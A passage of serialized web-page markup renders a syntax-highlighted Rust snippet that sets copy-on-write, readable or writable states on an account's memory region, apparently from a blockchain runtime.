token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_region \"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            region\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            callee_account\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"can_data_be_changed\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_ok\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// If the account is still shared it means it wasn't written to yet during this\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// transaction. We map it as CoW and it'll be copied the first time something\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// tries to write into it.\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_shared\"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index_in_transaction \"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_index_in_transaction\"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],\"                    region\\n\",[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}],[\"$\",\"span\",\"code-segement215\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement220\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement224\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    region\"]}],[\"$\",\"span\",\"code-segement240\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}],[\"$\",\"span\",\"code-segement242\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement249\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],\"\\n\",[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement262\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement263\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement264\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement268\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement272\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"_\"]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement276\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement277\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement278\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement279\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement280\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement281\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                region\"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement288\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement290\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[35]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement303\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            _ \"]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement306\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber 